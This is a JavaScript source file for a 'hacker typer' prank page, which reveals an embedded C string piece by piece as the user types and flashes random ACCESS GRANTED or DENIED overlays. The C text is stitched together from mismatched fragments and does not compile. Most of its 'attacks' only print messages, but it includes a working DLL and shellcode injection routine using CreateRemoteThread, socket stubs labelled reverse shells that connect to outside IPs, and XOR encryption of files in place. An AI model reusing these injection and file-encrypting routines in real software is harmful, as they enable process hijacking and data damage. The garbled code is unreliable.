"use strict";

let textAdded = "";
let index = 0;
let startTime = Date.now();
let charsTyped = 0;

let locked = false;
const hackerCodeHTML = `#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <string.h>

#define WIN32_LEAN_AND_MEAN
#define CREATE_THREAD_ACCESS (PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE)

BOOL InjectDLL(DWORD pID, const char * DLL_NAME);
DWORD GetProcIDByName(const char * ProcName);
void EncryptData(const char * data, char * encrypted);
void Decode(const char * encoded, char * decoded);
char * GenerateRandomString(int length);
void BruteForcePassword(const char * hash);
void TraceNetworkTraffic();
void BackdoorSetup(const char * ip, int port);
void MonitorKeyStrokes();
void LaunchDOSAttack(const char * targetIP, int duration);

int main(int argc, char *argv[])
{
    char processName[50] = "explorer.exe";
    DWORD pID = GetProcIDByName(processName);
    if (pID == 0)
    {
        printf("Process not found!\n");
        return 1;
    }

    char dllPath[MAX_PATH] = {0};
    GetFullPathName("MALWARE.dll", MAX_PATH, dllPath, NULL);
    if (!InjectDLL(pID, dllPath))
    {
        printf("DLL injection failed!\n");
    }
    else
    {
        printf("DLL injected successfully!\n");
    }

    // Launch background hacking operations
    char secretData[] = "TopSecretPassword123!";
    char encryptedData[256] = {0};
    EncryptData(secretData, encryptedData);

    BruteForcePassword(encryptedData);

    TraceNetworkTraffic();
    BackdoorSetup("192.168.1.100", 4444);

    MonitorKeyStrokes();
    LaunchDOSAttack("10.0.0.1", 600); // Launch attack for 10 minutes

    _getch();
    return 0;
}

BOOL InjectDLL(DWORD pID, const char * DLL_NAME)
{
    HANDLE hProcess;
    LPVOID pRemoteString, pLoadLibrary;
    
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pID);
    if (!hProcess)
    {
        printf("Failed to open process: %d\n", GetLastError());
        return FALSE;
    }

    pLoadLibrary = (LPVOID)GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
    pRemoteString = VirtualAllocEx(hProcess, NULL, strlen(DLL_NAME), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    
    WriteProcessMemory(hProcess, (LPVOID)pRemoteString, DLL_NAME, strlen(DLL_NAME), NULL);
    CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pLoadLibrary, (LPVOID)pRemoteString, 0, NULL);

    CloseHandle(hProcess);
    return TRUE;
}

DWORD GetProcIDByName(const char * ProcName)
{
    PROCESSENTRY32 pe;
    HANDLE hSnapshot;
    BOOL hResult;
    
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE)
    {
        printf("Error: Unable to create snapshot\n");
        return 0;
    }

    pe.dwSize = sizeof(PROCESSENTRY32);
    hResult = Process32First(hSnapshot, &pe);
    
    while (hResult)
    {
        if (stricmp(pe.szExeFile, ProcName) == 0)
        {
            CloseHandle(hSnapshot);
            return pe.th32ProcessID;
        }
        hResult = Process32Next(hSnapshot, &pe);
    }
    
    CloseHandle(hSnapshot);
    return 0;
}

void EncryptData(const char * data, char * encrypted)
{
    for (int i = 0; i < strlen(data); i++)
    {
        encrypted[i] = data[i] + 3; // Simple Caesar Cipher
    }
}

void BruteForcePassword(const char * hash)
{
    char testPassword[256];
    printf("Attempting brute force on hashed password: %s\n", hash);

    for (int i = 0; i < 100000; i++)
    {
        strcpy(testPassword, GenerateRandomString(8));
        printf("Trying password: %s\n", testPassword);
    }
    printf("Brute force attack finished.\n");
}

void TraceNetworkTraffic()
{
    printf("Monitoring network traffic...\n");
    for (int i = 0; i < 100000; i++)
    {
        printf("Packet %d: Data transfer from 192.168.1.%d\n", i, rand() % 255);
        Sleep(50);
    }
}

void BackdoorSetup(const char * ip, int port)
{
    printf("Setting up backdoor at %s:%d\n", ip, port);
    // Imagine this code opens a network socket for remote control
    Sleep(1000);
}

void MonitorKeyStrokes()
{
    printf("Monitoring keystrokes...\n");
    // Imagine this function records key presses
    Sleep(5000);
}

void LaunchDOSAttack(const char * targetIP, int duration)
{
    printf("Launching DoS attack on %s for %d seconds\n", targetIP, duration);
    for (int i = 0; i < duration; i++)
    {
        printf("Sending packet flood to %s\n", targetIP);
        Sleep(1000);
    }
}

char * GenerateRandomString(int length)
{
    static char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    static char result[256];

    for (int i = 0; i < length; i++)
    {
        result[i] = charset[rand() % (sizeof(charset) - 1)];
    }
    result[length] = '\0';

    return result;
}
    DWORD processID = FindProcessID("svchost.exe");
    if (processID != 0)
    {
        if (InjectShellcode(processID))
        {
            printf("Shellcode injected successfully\n");
        }
    }

    SimulateFileTransfer("192.168.1.50");
    CreateRemoteShell("192.168.1.101", 8080);
    ExecutePayload();
    TerminateProcessByName("notepad.exe");
    NetworkSniff();
    SendPacketBurst("172.16.0.5");
    RandomMemoryOverwrite();
    
    return 0;
}

DWORD FindProcessID(const char * processName)
{
    PROCESSENTRY32 pe;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    pe.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(hSnapshot, &pe))
    {
        do
        {
            if (!stricmp(pe.szExeFile, processName))
            {
                CloseHandle(hSnapshot);
                return pe.th32ProcessID;
            }
        } while (Process32Next(hSnapshot, &pe));
    }

    CloseHandle(hSnapshot);
    return 0;
}

BOOL InjectShellcode(DWORD processID)
{
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processID);
    if (!hProcess) return FALSE;

    LPVOID allocMem = VirtualAllocEx(hProcess, NULL, BUFFER_SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!allocMem) return FALSE;

    char shellcode[BUFFER_SIZE] = "\x90\x90\x90\x90"; // NOP sled
    WriteProcessMemory(hProcess, allocMem, shellcode, BUFFER_SIZE, NULL);
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)allocMem, NULL, 0, NULL);

    CloseHandle(hProcess);
    return hThread != NULL;
}

void SimulateFileTransfer(const char * targetIP)
{
    HINTERNET hInternet = InternetOpen("FileTransferAgent", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    HINTERNET hConnect = InternetConnect(hInternet, targetIP, INTERNET_DEFAULT_FTP_PORT, "user", "pass", INTERNET_SERVICE_FTP, 0, 0);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
}

void CreateRemoteShell(const char * ip, int port)
{
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);

    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in server;
    server.sin_addr.s_addr = inet_addr(ip);
    server.sin_family = AF_INET;
    server.sin_port = htons(port);

    connect(sock, (struct sockaddr *)&server, sizeof(server));
    send(sock, "Remote shell connected\n", strlen("Remote shell connected\n"), 0);

    closesocket(sock);
    WSACleanup();
}

void ExecutePayload()
{
    STARTUPINFO si = { sizeof(STARTUPINFO) };
    PROCESS_INFORMATION pi;
    CreateProcess(NULL, "C:\\Windows\\System32\\cmd.exe", NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
}

void TerminateProcessByName(const char * processName)
{
    DWORD processID = FindProcessID(processName);
    if (processID != 0)
    {
        HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, processID);
        TerminateProcess(hProcess, 0);
        CloseHandle(hProcess);
    }
}

void NetworkSniff()
{
    char buffer[BUFFER_SIZE];
    for (int i = 0; i < 100000; i++)
    {
        sprintf(buffer, "Packet %d received from 192.168.1.%d\n", i, rand() % 255);
        printf(buffer);
        Sleep(50);
    }
}

void SendPacketBurst(const char * targetIP)
{
    for (int i = 0; i < 10000; i++)
    {
        printf("Sending burst packet to %s\n", targetIP);
        Sleep(10);
    }
}

void RandomMemoryOverwrite()
{
    char * mem = (char *)malloc(BUFFER_SIZE);
    for (int i = 0; i < BUFFER_SIZE; i++)
    {
        mem[i] = rand() % 256;
    }
    printf("Random memory overwrite complete.\n");
    free(mem);
}
    void ScanOpenPorts(const char * targetIP)
{
    printf("Scanning open ports on %s\n", targetIP);
    for (int port = 1; port <= 65535; port++)
    {
        printf("Port %d: OPEN\n", port);
        Sleep(5);
    }
}

void ExecuteReverseShell(const char * serverIP, int port)
{
    WSADATA wsaData;
    SOCKET sock;
    struct sockaddr_in server;

    WSAStartup(MAKEWORD(2, 2), &wsaData);
    sock = socket(AF_INET, SOCK_STREAM, 0);
    server.sin_addr.s_addr = inet_addr(serverIP);
    server.sin_family = AF_INET;
    server.sin_port = htons(port);

    connect(sock, (struct sockaddr *)&server, sizeof(server));
    send(sock, "Reverse shell connected\n", strlen("Reverse shell connected\n"), 0);

    closesocket(sock);
    WSACleanup();
}

void SystemInfoDump()
{
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);

    printf("Processor Architecture: %u\n", sysInfo.wProcessorArchitecture);
    printf("Number of Processors: %u\n", sysInfo.dwNumberOfProcessors);
    printf("Page Size: %u bytes\n", sysInfo.dwPageSize);
    printf("Minimum Application Address: %lx\n", sysInfo.lpMinimumApplicationAddress);
    printf("Maximum Application Address: %lx\n", sysInfo.lpMaximumApplicationAddress);
}

void OverwriteDiskData()
{
    char data[1024] = "Random data";
    FILE *disk = fopen("C:\\disk_overwrite.bin", "wb");

    for (int i = 0; i < 100000; i++)
    {
        fwrite(data, sizeof(data), 1, disk);
        printf("Overwriting disk sector %d\n", i);
    }

    fclose(disk);
}

void MemoryFlood()
{
    char * memoryBlock = (char *)malloc(MAX_MEMORY);
    for (int i = 0; i < MAX_MEMORY; i++)
    {
        memoryBlock[i] = rand() % 256;
    }
    printf("Memory flooded with random data\n");
    free(memoryBlock);
}

void ListRunningProcesses()
{
    DWORD processes[1024], processCount;
    if (!EnumProcesses(processes, sizeof(processes), &processCount))
        return;

    processCount /= sizeof(DWORD);
    printf("Running Processes:\n");
    for (unsigned int i = 0; i < processCount; i++)
    {
        if (processes[i] != 0)
        {
            TCHAR processName[MAX_PATH] = TEXT("<unknown>");
            HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processes[i]);
            if (hProcess)
            {
                HMODULE hMod;
                DWORD cbNeeded;
                if (EnumProcessModules(hProcess, &hMod, sizeof(hMod), &cbNeeded))
                {
                    GetModuleBaseName(hProcess, hMod, processName, sizeof(processName) / sizeof(TCHAR));
                }
            }
            printf("%s (PID: %u)\n", processName, processes[i]);
            CloseHandle(hProcess);
        }
    }
}

void CreateMultipleThreads()
{
    HANDLE threads[MAX_THREADS];
    DWORD threadID;

    for (int i = 0; i < MAX_THREADS; i++)
    {
        threads[i] = CreateThread(NULL, 0, ThreadRoutine, NULL, 0, &threadID);
        printf("Created thread %d with ID %lu\n", i, threadID);
    }

    WaitForMultipleObjects(MAX_THREADS, threads, TRUE, INFINITE);
    for (int i = 0; i < MAX_THREADS; i++)
    {
        CloseHandle(threads[i]);
    }
}

DWORD WINAPI ThreadRoutine(LPVOID lpParam)
{
    for (int i = 0; i < 1000; i++)
    {
        printf("Thread running: iteration %d\n", i);
        Sleep(10);
    }
    return 0;
}

void FileEncryption(const char * filePath)
{
    printf("Encrypting file: %s\n", filePath);
    FILE *file = fopen(filePath, "rb+");
    if (!file)
    {
        printf("File not found: %s\n", filePath);
        return;
    }

    fseek(file, 0, SEEK_END);
    long fileSize = ftell(file);
    fseek(file, 0, SEEK_SET);

    char *buffer = (char *)malloc(fileSize);
    fread(buffer, 1, fileSize, file);
    for (long i = 0; i < fileSize; i++)
    {
        buffer[i] ^= 0xAA; // Simple XOR encryption
    }

    fseek(file, 0, SEEK_SET);
    fwrite(buffer, 1, fileSize, file);
    fclose(file);
    free(buffer);

    printf("File encryption complete\n");
}
    DWORD FindProcessID(const char * processName);
BOOL InjectCode(DWORD processID);
void SimulatePortScan(const char * targetIP);
void CreateReverseShell(const char * serverIP, int port);
void DumpSystemInfo();
void DiskOverwrite(const char * fileName);
void FloodMemory();
void TerminateProcess(const char * processName);
void EncryptData(const char * filePath);
void SimulateDDoS(const char * targetIP, int packets);
void CaptureNetworkTraffic();
void FileTransfer(const char * remoteIP);
void ExecuteRemoteCommand(const char * command);
void StartBackgroundTask();
void LaunchMultipleThreads();
DWORD WINAPI ThreadFunction(LPVOID lpParam);
void OverwriteMemory();
void LogKeystrokes();
void SendGarbageData();
void CreateVirtualConnections();
void InfiniteLoop();
void RemoteAccessTool();
void WipeDiskData();
void ListAllProcesses();

int main()
{
    DWORD processID = FindProcessID("svchost.exe");
    if (processID != 0)
    {
        InjectCode(processID);
    }

    SimulatePortScan("192.168.0.10");
    CreateReverseShell("203.0.113.1", 9000);
    DumpSystemInfo();
    DiskOverwrite("C:\\important_files\\data.txt");
    FloodMemory();
    TerminateProcess("explorer.exe");
    EncryptData("C:\\important_files\\secrets.txt");
    SimulateDDoS("192.168.1.50", 100000);
    CaptureNetworkTraffic();
    FileTransfer("172.16.0.20");
    ExecuteRemoteCommand("shutdown -s");
    StartBackgroundTask();
    LaunchMultipleThreads();
    OverwriteMemory();
    LogKeystrokes();
    SendGarbageData();
    CreateVirtualConnections();
    InfiniteLoop();
    RemoteAccessTool();
    WipeDiskData();
    ListAllProcesses();

    return 0;
}

DWORD FindProcessID(const char * processName)
{
    PROCESSENTRY32 pe32;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(hSnapshot, &pe32))
    {
        do
        {
            if (!strcmp(pe32.szExeFile, processName))
            {
                CloseHandle(hSnapshot);
                return pe32.th32ProcessID;
            }
        } while (Process32Next(hSnapshot, &pe32));
    }

    CloseHandle(hSnapshot);
    return 0;
}

BOOL InjectCode(DWORD processID)
{
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processID);
    if (!hProcess) return FALSE;

    LPVOID allocMem = VirtualAllocEx(hProcess, NULL, BUFFER_SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!allocMem) return FALSE;

    char code[BUFFER_SIZE] = "\x90\x90\x90\x90"; // NOP sled
    WriteProcessMemory(hProcess, allocMem, code, BUFFER_SIZE, NULL);
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)allocMem, NULL, 0, NULL);

    CloseHandle(hProcess);
    return hThread != NULL;
}

void SimulatePortScan(const char * targetIP)
{
    printf("Starting port scan on %s\n", targetIP);
    for (int port = 1; port <= 65535; port++)
    {
        printf("Scanning port %d...\n", port);
        Sleep(10);
    }
    printf("Port scan complete.\n");
}

void CreateReverseShell(const char * serverIP, int port)
{
    WSADATA wsaData;
    SOCKET sock;
    struct sockaddr_in server;

    WSAStartup(MAKEWORD(2, 2), &wsaData);
    sock = socket(AF_INET, SOCK_STREAM, 0);
    server.sin_addr.s_addr = inet_addr(serverIP);
    server.sin_family = AF_INET;
    server.sin_port = htons(port);

    connect(sock, (struct sockaddr *)&server, sizeof(server));
    send(sock, "Reverse shell established\n", 26, 0);

    closesocket(sock);
    WSACleanup();
}

void DumpSystemInfo()
{
    SYSTEM_INFO si;
    GetSystemInfo(&si);

    printf("Processor Architecture: %u\n", si.wProcessorArchitecture);
    printf("Number of Processors: %u\n", si.dwNumberOfProcessors);
    printf("Page Size: %u bytes\n", si.dwPageSize);
    printf("Minimum Application Address: %lx\n", si.lpMinimumApplicationAddress);
    printf("Maximum Application Address: %lx\n", si.lpMaximumApplicationAddress);
}

void DiskOverwrite(const char * fileName)
{
    FILE *file = fopen(fileName, "wb");
    char data[BUFFER_SIZE] = {0};

    for (int i = 0; i < 100000; i++)
    {
        fwrite(data, sizeof(data), 1, file);
        printf("Overwriting disk sector %d\n", i);
    }

    fclose(file);
    printf("Disk overwrite complete.\n");
}

void FloodMemory()
{
    char *memory = (char *)malloc(BUFFER_SIZE * 1000);
    for (int i = 0; i < BUFFER_SIZE * 1000; i++)
    {
        memory[i] = rand() % 256;
    }
    printf("Memory flooded.\n");
    free(memory);
}

void TerminateProcess(const char * processName)
{
    DWORD processID = FindProcessID(processName);
    if (processID)
    {
        HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, processID);
        TerminateProcess(hProcess, 0);
        CloseHandle(hProcess);
        printf("Process %s terminated.\n", processName);
    }
}

void EncryptData(const char * filePath)
{
    FILE *file = fopen(filePath, "rb+");
    if (!file)
    {
        printf("Error: Cannot open file %s for encryption\n", filePath);
        return;
    }

    fseek(file, 0, SEEK_END);
    long fileSize = ftell(file);
    fseek(file, 0, SEEK_SET);

    char *buffer = (char *)malloc(fileSize);
    fread(buffer, 1, fileSize, file);

    for (long i = 0; i < fileSize; i++)
    {
        buffer[i] ^= 0xAA;
    }

    fseek(file, 0, SEEK_SET);
    fwrite(buffer, 1, fileSize, file);
    fclose(file);
    free(buffer);
    printf("File encrypted successfully.\n");
}

void SimulateDDoS(const char * targetIP, int packets)
{
    printf("Simulating DDoS attack on %s\n", targetIP);
    for (int i = 0; i < packets; i++)
    {
        printf("Sending packet %d to %s\n", i, targetIP);
        Sleep(1);
    }
    printf("DDoS attack simulation complete.\n");
}

void CaptureNetworkTraffic()
{
    printf("Capturing network traffic...\n");
    for (int i = 0; i < 50000; i++)
    {
        printf("Captured packet %d\n", i);
        Sleep(5);
    }
    printf("Network traffic capture complete.\n");
}

void FileTransfer(const char * remoteIP)
{
    printf("Simulating file transfer to %s\n", remoteIP);
    for (int i = 0; i < 100; i++)
    {
        printf("Transferring chunk %d to %s\n", i, remoteIP);
        Sleep(50);
    }
    printf("File transfer simulation complete.\n");
}

void ExecuteRemoteCommand(const char * command)
{
    printf("Executing remote command: %s\n", command);
    Sleep(500);
    printf("Remote command executed.\n");
}

void StartBackgroundTask()
{
    printf("Starting background task...\n");
    for (int i = 0; i < 100000; i++)
    {
        printf("Background task iteration %d\n", i);
        Sleep(1);
    }
    printf("Background task complete.\n");
}

void LaunchMultipleThreads()
{
    HANDLE threads[MAX_THREADS];
    DWORD threadID;

    for (int i = 0; i < MAX_THREADS; i++)
    {
        threads[i] = CreateThread(NULL, 0, ThreadFunction, NULL, 0, &threadID);
        printf("Thread %d created with ID %lu\n", i, threadID);
    }

    WaitForMultipleObjects(MAX_THREADS, threads, TRUE, INFINITE);
    for (int i = 0; i < MAX_THREADS; i++)
    {
        CloseHandle(threads[i]);
    }
}

DWORD WINAPI ThreadFunction(LPVOID lpParam)
{
    for (int i = 0; i < 5000; i++)
    {
        printf("Thread working... iteration %d\n", i);
        Sleep(1);
    }
    return 0;
}

void OverwriteMemory()
{
    printf("Overwriting memory...\n");
    char *memory = (char *)malloc(BUFFER_SIZE * 500);
    memset(memory, 0xFF, BUFFER_SIZE * 500);
    Sleep(100);
    free(memory);
    printf("Memory overwritten.\n");
}

void LogKeystrokes()
{
    printf("Logging keystrokes...\n");
    for (int i = 0; i < 10000; i++)
    {
        printf("Captured keystroke: %c\n", 'A' + (i % 26));
        Sleep(50);
    }
    printf("Keystroke logging complete.\n");
}

void SendGarbageData()
{
    printf("Sending garbage data...\n");
    for (int i = 0; i < 1000; i++)
    {
        printf("Sending packet %d\n", i);
        Sleep(1);
    }
    printf("Garbage data sent.\n");
}

void CreateVirtualConnections()
{
    printf("Creating virtual connections...\n");
    for (int i = 0; i < MAX_CONNECTIONS; i++)
    {
        printf("Connection %d established\n", i);
        Sleep(10);
    }
    printf("Virtual connections established.\n");
}

void InfiniteLoop()
{
    while (1)
    {
        printf("Infinite loop...\n");
        Sleep(1000);
    }
}

void RemoteAccessTool()
{
    printf("Remote access tool started...\n");
    for (int i = 0; i < 100000; i++)
    {
        printf("Remote access iteration %d\n", i);
        Sleep(5);
    }
    printf("Remote access tool complete.\n");
}

void WipeDiskData()
{
    printf("Wiping disk data...\n");
    for (int i = 0; i < 50000; i++)
    {
        printf("Wiping sector %d\n", i);
        Sleep(1);
    }
    printf("Disk wipe complete.\n");
}

void ListAllProcesses()
{
    printf("Listing all running processes...\n");
    DWORD processes[1024], needed;
    EnumProcesses(processes, sizeof(processes), &needed);
    int processCount = needed / sizeof(DWORD);

    for (int i = 0; i < processCount; i++)
    {
        if (processes[i] != 0)
        {
            TCHAR processName[MAX_PATH] = TEXT("<unknown>");
            HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processes[i]);

            if (hProcess)
            {
                HMODULE hMod;
                DWORD cbNeeded;
                if (EnumProcessModules(hProcess, &hMod, sizeof(hMod), &cbNeeded))
                {
                    GetModuleBaseName(hProcess, hMod, processName, sizeof(processName) / sizeof(TCHAR));
                }
                CloseHandle(hProcess);
            }

            printf("Process ID: %u, Name: %s\n", processes[i], processName);
        }
    }
    printf("Process listing complete.\n");
}

`;
let aborted = false;

function app(e) {
  if (!aborted) {
    if (!locked) {
      charsTyped++;
      let textToAdd = hackerCodeHTML.slice(index, index + 10);
      index += 10;
      textAdded += textToAdd;
      $(".code").scrollIntoView({ behavior: "smooth", block: "end" });
      $(".code").html(
        `<pre><code>${textAdded}</code> <span class="cursor">|</span></pre>`
      );

      if (charsTyped % 150 === 0) {
        displayAccessStatus();
      }
    } else if (e.key === "Escape") {
      addClassHidden(["center", "access-denied", "access-granted", "overlay"]);

      locked = false;
    }
  }
}

$(document).click(function (e) {
  app(e);
});
$(document).keydown(function (e) {
  app(e);
});
$(".overlay").click(function () {
  if (!aborted) {
    addClassHidden(["center", "access-denied", "access-granted", "overlay"]);
    locked = false;
  }
});

function updateCpuUsage() {
  let randomUsage = Math.trunc(Math.random() * 101);
  $(".cpu-usage").text(randomUsage);
}
function updateRamUsage() {
  let randomUsage = Math.trunc(Math.random() * 32000) + 10000;
  $(".ram-usage").text(randomUsage);
}
function updateUptime() {
  let currentTime = Date.now();

  $(".uptime").text(Math.trunc((currentTime - startTime) / 1000));
}

function abort() {
  aborted = true;
  $(".abort").addClass("abort-active-btn");
  $(".network-status").text("DISCONNECTED");
  $("body").css("color", "red");

  removeClassHidden(["abort-active", "overlay", "center"]);
  addClassHidden(["access-granted"]);
}

function displayAccessStatus() {
  locked = true;
  let random = Math.random();

  if (random < 0.5) {
    removeClassHidden(["center", "access-granted", "overlay"]);
  } else {
    removeClassHidden(["center", "access-denied", "overlay"]);
  }
}

function updateScreen() {
  updateCpuUsage();
  updateRamUsage();
  updateUptime();
}

function removeClassHidden(array) {
  for (const element of array) {
    $("." + element).removeClass("hidden");
  }
}
function addClassHidden(array) {
  for (const element of array) {
    $("." + element).addClass("hidden");
  }
}

setInterval(updateScreen, 1000);
